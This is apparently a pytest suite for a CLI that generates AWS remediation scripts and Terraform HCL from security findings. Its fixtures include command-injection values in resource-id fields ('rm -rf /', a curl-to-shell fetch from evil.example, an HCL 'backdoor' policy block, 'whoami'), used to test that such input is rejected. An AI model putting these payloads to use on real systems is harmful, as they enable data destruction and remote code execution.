"""End-to-end CLI tests, including the shell/HCL validity of real output.

Where the tools are available, generated artifacts are checked with the actual
parsers -- ``bash -n`` and ``tofu``. Asserting on substrings only would not catch
output that reads correctly and does not parse.
"""

from __future__ import annotations

import json
import shutil
import subprocess

import pytest

from remgen.cli import main
from remgen.recipes import all_recipes

GOOD = {
    "cloudtrail": {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "my-org-trail",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
    "s3": {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": "acme-prod-assets",
        "region": "us-west-2",
        "accountId": "123456789012",
    },
    "rds": {
        "policyId": "4d6662cd-9f34-41eb-b152-f24c692d4fbf",
        "resourceId": "prod-postgres-01",
        "region": "eu-west-1",
        "accountId": "999988887777",
    },
    "kms": {
        "policyId": "995e8d78-940a-45bf-bac1-61a1fdb00d7a",
        "resourceId": "1234abcd-12ab-34cd-56ef-1234567890ab",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
    "dynamodb": {
        "policyId": "468d7976-445f-44c2-b9fb-45fb1005f373",
        "resourceId": "GameScores",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
}

#: Injection attempts. None of these substrings may appear in any artifact.
MALICIOUS = [
    {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "trail; rm -rf /",
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "$(curl evil.example/x|sh)",
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": 'b"\nresource "aws_iam_role_policy" "backdoor" {',
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": "bucket`whoami`",
        "region": "us-east-1",
        "accountId": "1",
    },
]

#: Substrings unique to the injection attempts above. Deliberately excludes
#: characters that legitimately appear in the artifacts' own explanatory prose
#: (backticks quote `tofu plan`, and "resource" appears throughout), so a failure
#: here means a finding value actually leaked.
INJECTED_SUBSTRINGS = ["rm -rf", "curl evil", "whoami", "backdoor", "`whoami`"]

#: The only command substitution the generator is permitted to emit: the account
#: guard in the script header. Checked as an exact allowlist rather than dropping
#: "$(" from the blocklist above, because command substitution is precisely what an
#: injected resource id would produce -- so its presence must stay accounted for,
#: not merely tolerated.
ALLOWED_SUBSTITUTION = (
    'actual_account="$(aws sts get-caller-identity --query Account --output text)"'
)


@pytest.fixture
def env(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("REMGEN_CACHE_DIR", str(tmp_path / "cache"))
    return tmp_path


def _write(path, records):
    path.write_text(json.dumps(records), encoding="utf-8")
    return path


def _run(argv):
    return main(argv)


# Output is split per account (and per region for HCL), so tests locate artifacts
# by extension rather than by a fixed filename. See remgen.layout for the rules.


def _scripts(out):
    return sorted(out.glob("*.sh"))


def _tfs(out):
    return sorted(out.glob("*.tf"))


def _joined(out, ext):
    """Concatenate every artifact of one type, for whole-output assertions."""
    return "\n".join(p.read_text(encoding="utf-8") for p in sorted(out.glob(f"*{ext}")))


# ---------------------------------------------------------------------------
# generate
# ---------------------------------------------------------------------------


def test_generate_writes_both_artifacts(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    assert _run(["generate", "--findings", str(findings), "--out", str(out)]) == 0
    assert _scripts(out)
    assert _tfs(out)
    captured = capsys.readouterr().out
    assert "made no AWS changes" in captured


def test_generate_defaults_to_safest_tier_and_says_what_it_withheld(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    # A silent cap would read as "nothing more to do".
    assert "Withheld by safety tier" in captured
    assert "--tier caution" in captured


def test_tier_all_includes_more_remediations(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "safe")])
    safe_out = capsys.readouterr().out
    _run(["generate", "--findings", str(findings), "--out", str(env / "all"), "--tier", "all"])
    all_out = capsys.readouterr().out

    safe_script = _joined(env / "safe", ".sh")
    all_script = _joined(env / "all", ".sh")
    assert all_script.count("aws ") > safe_script.count("aws ")
    assert "Withheld by safety tier" not in all_out
    assert "Withheld by safety tier" in safe_out


def test_generate_reports_unsupported_policies(env, capsys):
    findings = _write(
        env / "f.json",
        [
            GOOD["cloudtrail"],
            {
                "policyId": "0252a65d-7538-463b-831c-5acf983e4c76",
                "resourceId": "my-api",
                "region": "us-east-1",
                "accountId": "1",
            },
        ],
    )
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert "No recipe available" in captured
    assert "intentionally partial" in captured


def test_generate_counts_reconcile(env, capsys):
    records = list(GOOD.values()) + MALICIOUS + ["not-an-object"]
    findings = _write(env / "f.json", records)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert f"Records read:         {len(records)}" in captured
    assert f"rejected:           {len(MALICIOUS) + 1}" in captured


def test_generate_with_no_findings_is_not_an_error(env, capsys):
    findings = _write(env / "f.json", [])
    assert _run(["generate", "--findings", str(findings), "--out", str(env / "art")]) == 0
    assert "Nothing to generate" in capsys.readouterr().out


def test_generate_missing_file_exits_nonzero(env, capsys):
    code = _run(["generate", "--findings", str(env / "nope.json"), "--out", str(env / "art")])
    assert code == 2
    assert "error:" in capsys.readouterr().err


def test_script_is_executable(env):
    findings = _write(env / "f.json", [GOOD["cloudtrail"]])
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    scripts = _scripts(env / "art")
    assert scripts
    assert all(p.stat().st_mode & 0o111 for p in scripts)


# ---------------------------------------------------------------------------
# Injection resistance -- the highest-consequence property
# ---------------------------------------------------------------------------


def test_malicious_findings_never_reach_artifacts(env, capsys):
    findings = _write(env / "f.json", MALICIOUS + list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"])
    captured = capsys.readouterr().out
    assert "rejected" in captured

    for path in _scripts(env / "art") + _tfs(env / "art"):
        text = path.read_text(encoding="utf-8")
        for needle in INJECTED_SUBSTRINGS:
            assert needle not in text, f"{needle!r} leaked into {path.name}"
        # Command substitution is what an injected resource id would produce, so
        # every occurrence must be one the generator intends.
        assert text.count("$(") == text.count(ALLOWED_SUBSTITUTION), (
            f"unexpected command substitution in {path.name}"
        )


def test_malicious_findings_are_reported_as_rejected(env, capsys):
    findings = _write(env / "f.json", MALICIOUS)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert f"{len(MALICIOUS)} input record(s) were rejected" in captured
    assert "Refusing to generate rather than escape" in captured


# ---------------------------------------------------------------------------
# Real-parser validation of generated artifacts
# ---------------------------------------------------------------------------


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash not available")
def test_generated_script_parses_as_bash(env):
    findings = _write(env / "f.json", list(GOOD.values()) + MALICIOUS)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"])
    scripts = _scripts(env / "art")
    assert scripts
    for script in scripts:
        result = subprocess.run(  # noqa: S603
            [shutil.which("bash"), "-n", str(script)],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0, f"{script.name}: {result.stderr}"


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash not available")
def test_empty_script_still_parses_as_bash(env):
    findings = _write(env / "f.json", [])
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    # An empty run must still emit a runnable script, not a truncated one.
    for script in _scripts(env / "art"):
        result = subprocess.run(  # noqa: S603
            [shutil.which("bash"), "-n", str(script)], capture_output=True, text=True
        )
        assert result.returncode == 0, result.stderr


TOFU = shutil.which("tofu") or shutil.which("terraform")


def _tofu_check(tf_file, work):
    """Run the real ``fmt -check`` and ``validate`` against a generated .tf file.

    Substring assertions cannot catch output that reads correctly and does not
    parse, so the actual toolchain is the oracle here.
    """
    work.mkdir(parents=True, exist_ok=True)
    shutil.copy(tf_file, work / "main.tf")
    (work / "provider.tf").write_text(
        'terraform {\n  required_providers {\n'
        '    aws = { source = "hashicorp/aws", version = "~> 5.0" }\n'
        "  }\n}\n"
        'provider "aws" {\n  region = "us-east-1"\n}\n',
        encoding="utf-8",
    )

    fmt = subprocess.run(  # noqa: S603
        [TOFU, "fmt", "-check", "-no-color", "main.tf"],
        cwd=work,
        capture_output=True,
        text=True,
    )
    assert fmt.returncode == 0, f"generated HCL is not canonically formatted:\n{fmt.stdout}"

    init = subprocess.run(  # noqa: S603
        [TOFU, "init", "-no-color", "-backend=false"],
        cwd=work,
        capture_output=True,
        text=True,
        timeout=300,
    )
    if init.returncode != 0:
        pytest.skip(f"provider download unavailable: {init.stderr[-200:]}")

    validate = subprocess.run(  # noqa: S603
        [TOFU, "validate", "-no-color"], cwd=work, capture_output=True, text=True
    )
    assert validate.returncode == 0, f"generated HCL failed validate:\n{validate.stdout}"


def _tofu_check_all(out, work_root):
    """Validate every generated .tf, each in its own workspace.

    One workspace per file, because that is how they are meant to be used: each
    file targets one account and region and expects a provider configured for it.
    Concatenating them into a single workspace would test a usage the tool
    explicitly does not produce.
    """
    files = _tfs(out)
    assert files, "no HCL was generated"
    for index, tf_file in enumerate(files):
        _tofu_check(tf_file, work_root / f"tf{index}")


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_generated_hcl_is_valid_and_formatted(env):
    findings = _write(env / "f.json", list(GOOD.values()) + MALICIOUS)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"])
    _tofu_check_all(env / "art", env / "work")


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_same_resource_name_in_two_accounts_still_validates(env):
    """The collision case, checked by the real parser rather than by substring.

    ``GameScores`` in dev and prod are two different tables, but both fold to the
    HCL label ``gamescores``. Two separate defects meet here. Before labels were
    assigned across the whole file, this emitted duplicate ``import`` and
    ``resource`` blocks and ``tofu validate`` failed with "Duplicate resource
    configuration" while the CLI reported success. Splitting by account fixes that
    a second way -- and fixes the worse problem underneath it, which is that a
    single provider cannot resolve imports in two accounts at all.
    """
    dev = dict(GOOD["dynamodb"], region="us-east-1", accountId="111111111111")
    prod = dict(GOOD["dynamodb"], region="us-west-2", accountId="222222222222")
    findings = _write(env / "f.json", [dev, prod])
    assert _run(
        ["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"]
    ) == 0

    # One file per account, each with exactly one block, and no file naming both.
    files = _tfs(env / "art")
    assert len(files) == 2
    for path in files:
        text = path.read_text(encoding="utf-8")
        assert text.count("import {") == 1
        owner = "111111111111" if "111111111111" in path.name else "222222222222"
        other = "222222222222" if owner == "111111111111" else "111111111111"
        assert other not in text, f"{path.name} references another account"

    _tofu_check_all(env / "art", env / "work")


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_every_recipe_pairs_one_import_with_one_resource(env):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"])
    text = _joined(env / "art", ".tf")
    # A resource block without an import block would create a duplicate resource.
    assert text.count("import {") == text.count('\nresource "')
    assert text.count("import {") == len(GOOD)


# ---------------------------------------------------------------------------
# policies
# ---------------------------------------------------------------------------


def test_policies_first_run_then_detects_new(env, capsys):
    catalog = env / "c.json"
    _write(catalog, [{"id": "1", "title": "Alpha", "category": "IAM"}])
    assert _run(["policies", "--catalog", str(catalog)]) == 0
    assert "first run" in capsys.readouterr().out

    _write(
        catalog,
        [
            {"id": "1", "title": "Alpha", "category": "IAM"},
            {"id": "2", "title": "Beta", "category": "Data"},
        ],
    )
    assert _run(["policies", "--catalog", str(catalog)]) == 0
    captured = capsys.readouterr().out
    assert "1 new policy" in captured
    assert "Beta" in captured


def test_no_save_leaves_snapshot_untouched(env, capsys):
    catalog = _write(env / "c.json", [{"id": "1", "title": "Alpha"}])
    _run(["policies", "--catalog", str(catalog)])
    capsys.readouterr()
    _write(catalog, [{"id": "1", "title": "Alpha"}, {"id": "2", "title": "Beta"}])
    _run(["policies", "--catalog", str(catalog), "--no-save"])
    capsys.readouterr()
    # Because the second run did not save, the third must still see Beta as new.
    _run(["policies", "--catalog", str(catalog)])
    assert "1 new policy" in capsys.readouterr().out


def test_policies_reports_coverage(env, capsys):
    catalog = _write(
        env / "c.json",
        [{"id": r.policy_id, "title": r.policy_title} for r in all_recipes()]
        + [{"id": "unsupported-1", "title": "Something else"}],
    )
    _run(["policies", "--catalog", str(catalog)])
    captured = capsys.readouterr().out
    assert f"Recipes available for {len(all_recipes())} of {len(all_recipes()) + 1}" in captured


def test_policies_lists_unsupported(env, capsys):
    catalog = _write(env / "c.json", [{"id": "x", "title": "Unsupported thing"}])
    _run(["policies", "--catalog", str(catalog), "--unsupported"])
    assert "Unsupported thing" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# verify / recipes
# ---------------------------------------------------------------------------


def test_verify_reports_model_source(env, capsys):
    code = _run(["verify"])
    captured = capsys.readouterr().out
    assert "Model source:" in captured
    # 0 when models are present, 4 when they are genuinely unavailable. Never a
    # silent pass in the unavailable case.
    assert code in (0, 4)
    if code == 4:
        assert "could not be checked" in captured


def test_recipes_lists_tiers_and_safety_notes(env, capsys):
    assert _run(["recipes"]) == 0
    captured = capsys.readouterr().out
    assert "SAFEST" in captured
    assert "Coverage is intentionally partial" in captured
    for recipe in all_recipes():
        assert recipe.policy_title in captured


def test_version_flag(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--version"])
    assert exc.value.code == 0
    assert "remgen" in capsys.readouterr().out


def test_no_subcommand_is_an_error(capsys):
    with pytest.raises(SystemExit) as exc:
        main([])
    assert exc.value.code != 0


# ---------------------------------------------------------------------------
# Operational failure paths: bad filesystem state must produce a message and a
# usable exit code, never a traceback. These are the invocation-plane cases the
# happy-path tests above never reach.
# ---------------------------------------------------------------------------


def _catalog_of(env):
    return _write(env / "c.json", [{"id": "1", "title": "Alpha", "category": "IAM"}])


def test_output_path_that_is_an_existing_file_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    collision = env / "not-a-dir"
    collision.write_text("existing file", encoding="utf-8")

    code = _run(["generate", "--findings", str(findings), "--out", str(collision)])
    captured = capsys.readouterr()
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out
    # The pre-existing file must be left alone, not clobbered.
    assert collision.read_text(encoding="utf-8") == "existing file"


def test_unwritable_output_directory_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    ro = env / "ro"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(ro / "sub")])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_unwritable_existing_output_directory_fails_cleanly(env, capsys):
    # mkdir(exist_ok=True) succeeds here; the failure is on write_text. Covered
    # separately because it exercises a different call in the same try block.
    findings = _write(env / "f.json", list(GOOD.values()))
    ro = env / "ro2"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(ro)])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 2
    assert "cannot write to" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_unwritable_cache_dir_warns_and_exits_degraded(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    catalog = _catalog_of(env)
    ro = env / "ro3"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(
            [
                "generate",
                "--findings", str(findings),
                "--catalog", str(catalog),
                "--out", str(env / "art"),
                "--cache-dir", str(ro / "cache"),
            ]
        )
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    # The artifacts were still produced, so this is not a hard failure -- but the
    # change detection did not run and the exit code must not read as success.
    assert code == 5
    assert "cannot write snapshot" in captured.out
    assert "cannot detect policy changes" in captured.out
    assert "Traceback" not in captured.err + captured.out
    assert _scripts(env / "art")


def test_policies_with_unwritable_cache_exits_degraded(env, capsys):
    catalog = _catalog_of(env)
    ro = env / "ro4"
    ro.mkdir()
    ro.chmod(0o500)
    try:
        code = _run(["policies", "--catalog", str(catalog), "--cache-dir", str(ro / "c")])
        captured = capsys.readouterr()
    finally:
        ro.chmod(0o700)
    assert code == 5
    assert "cannot write snapshot" in captured.out
    assert "Traceback" not in captured.err + captured.out


def test_corrupt_cache_warns_instead_of_claiming_first_run(env, capsys):
    """A corrupt baseline must not be reported as a first run.

    The silent-false-negative this guards: told "first run -- baseline saved, no
    changes this time", an operator concludes nothing changed. The baseline is then
    rebuilt from the current catalog, so a policy added since the last good run is
    never reported -- not on this run, and not on any later one.
    """
    catalog = _catalog_of(env)
    cache = env / "cache"
    cache.mkdir(parents=True, exist_ok=True)
    (cache / "policy-catalog.json").write_text("}{ corrupt", encoding="utf-8")

    code = _run(["policies", "--catalog", str(catalog), "--cache-dir", str(cache)])
    captured = capsys.readouterr().out
    assert code == 5
    assert "WARNING" in captured
    assert "NOT detected" in captured
    assert "first run" not in captured


def test_unreadable_findings_file_fails_cleanly(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    findings.chmod(0o000)
    try:
        code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
        captured = capsys.readouterr()
    finally:
        findings.chmod(0o600)
    assert code == 2
    assert "cannot read" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_findings_path_that_is_a_directory_fails_cleanly(env, capsys):
    code = _run(["generate", "--findings", str(env), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 2
    assert "cannot read" in captured.err
    assert "Traceback" not in captured.err + captured.out


@pytest.mark.parametrize(
    "payload",
    [
        "null",
        "123",
        '"a string"',
        '{"findings": "not-a-list"}',
        '{"unrelated": []}',
    ],
)
def test_structurally_wrong_json_fails_cleanly(env, capsys, payload):
    findings = env / "f.json"
    findings.write_text(payload, encoding="utf-8")
    code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 2
    assert "expected a JSON array" in captured.err
    assert "Traceback" not in captured.err + captured.out


def test_duplicate_findings_are_merged_and_counted(env, capsys):
    # Exports repeat findings (two scans, or a record joined across views). Emitting
    # the remediation twice produces two HCL blocks for one resource, which cannot
    # validate -- so duplicates are collapsed, and the collapse is reported rather
    # than being a silent change to the record count.
    one = GOOD["dynamodb"]
    findings = _write(env / "f.json", [one, one, one])
    assert _run(
        ["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"]
    ) == 0
    out = capsys.readouterr().out
    assert "Records read:         3" in out
    assert "duplicates merged:  2" in out
    assert "distinct findings:  1" in out
    assert "Remediations written: 1" in out

    assert _joined(env / "art", ".tf").count("import {") == 1
    script = _joined(env / "art", ".sh")
    assert len([ln for ln in script.splitlines() if ln.startswith("aws ")]) == 1


def test_same_resource_in_different_accounts_is_not_a_duplicate(env, capsys):
    # The inverse error would be worse than emitting a duplicate: collapsing two
    # genuinely different resources means one account's finding is never remediated.
    dev = dict(GOOD["dynamodb"], accountId="111111111111")
    prod = dict(GOOD["dynamodb"], accountId="222222222222")
    findings = _write(env / "f.json", [dev, prod])
    assert _run(
        ["generate", "--findings", str(findings), "--out", str(env / "art"), "--tier", "all"]
    ) == 0
    out = capsys.readouterr().out
    assert "duplicates merged" not in out
    assert "Remediations written: 2" in out


def test_junk_record_types_are_rejected_not_crashed(env, capsys):
    findings = env / "f.json"
    findings.write_text('[null, 1, "s", {}, [], true]', encoding="utf-8")
    code = _run(["generate", "--findings", str(findings), "--out", str(env / "a")])
    captured = capsys.readouterr()
    assert code == 0
    # All six are unusable, and every one is accounted for rather than dropped.
    assert "Records read:         6" in captured.out
    assert "rejected:           6" in captured.out
    assert "Traceback" not in captured.err + captured.out
